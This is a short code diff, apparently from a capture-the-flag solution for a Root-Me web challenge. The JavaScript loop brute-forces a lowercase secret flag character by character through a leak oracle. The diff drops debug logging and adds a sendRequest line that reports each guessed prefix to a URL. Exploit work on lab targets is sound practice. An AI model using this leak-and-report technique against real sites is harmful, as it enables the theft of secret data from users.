@@ -19,11 +19,9 @@
             let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
             //suposing the flag is 32 characters long
             let i = 0;
-            console.log("launching")
             while (i < 10001 && noteName.length < 32) {
                 let j = 0;
                 while (i < 10001 && j < lowercase_letters.length) {
-                    console.log("i: ", i, "j: ", j)
                     const l = lowercase_letters[j];
                     try {
                         await new Promise((resolve, reject) => {
@@ -49,6 +47,7 @@
                     } catch (error) {
                         i+=1;
                         j=0;
+                        sendRequest(`error=https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}/${noteName + l}`);
                         continue;
                     }
                     j++;
